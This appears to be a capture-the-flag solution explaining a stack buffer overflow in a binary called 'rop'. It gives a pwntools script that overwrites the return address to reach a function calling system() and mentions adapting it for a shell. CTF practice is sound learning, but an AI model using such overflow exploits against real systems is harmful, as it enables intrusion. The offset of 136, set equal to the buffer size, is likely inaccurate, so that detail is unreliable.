@@ -1,0 +1,58 @@
+To solve this challenge using `pwntools`, we need to exploit the buffer overflow in the `vulnerable_function` to call the `not_called` function, which executes `system("/bin/date")`. We can then modify the return address of `vulnerable_function` to point to the `not_called` function. Here are the steps and the corresponding code to achieve this:
+
+### Steps:
+1. **Identify the Buffer Overflow**: The `vulnerable_function` reads 256 bytes into a 136-byte buffer, causing a stack-based buffer overflow.
+2. **Find the Offset**: Determine the exact offset where the return address is overwritten.
+3. **Craft the Payload**: Create a payload that overwrites the return address with the address of `not_called`.
+4. **Exploit the Vulnerability**: Send the crafted payload to the binary using `pwntools`.
+
+### Code:
+```python
+from pwn import *
+
+# Set up the process
+elf = ELF('rop')
+p = process(elf.path)
+
+# Addresses
+not_called_addr = 0x080484A4
+
+# Craft the payload
+offset = 136  # Size of the buffer
+payload = b'A' * offset
+payload += p32(not_called_addr)
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the process
+p.interactive()
+```
+
+### Explanation:
+1. **Set up the process**:
+   - `ELF('rop')` loads the binary file.
+   - `process(elf.path)` starts the binary in a new process.
+
+2. **Addresses**:
+   - `not_called_addr` is the address of the `not_called` function, which calls `system("/bin/date")`.
+
+3. **Craft the payload**:
+   - `b'A' * offset` creates a buffer of 136 'A' characters to fill the buffer.
+   - `p32(not_called_addr)` appends the address of `not_called` in little-endian format to overwrite the return address.
+
+4. **Send the payload**:
+   - `p.sendline(payload)` sends the crafted payload to the binary.
+
+5. **Interact with the process**:
+   - `p.interactive()` allows you to interact with the process, so you can see the output of the `system("/bin/date")` call.
+
+### Running the Exploit:
+Save the script to a file, for example, `exploit.py`, and run it using `pwntools`:
+```sh
+python3 exploit.py
+```
+
+This should trigger the `not_called` function and print the current date. If you want to execute a different command (e.g., `/bin/bash`), you can modify the `not_called` function or use a similar approach to call `system` with a different argument.
+
+If the binary has ASLR (Address Space Layout Randomization) enabled, you may need to leak a memory address first to calculate the base address of the binary or libraries. However, based on the provided information, it seems ASLR is not enabled, making the exploit straightforward.
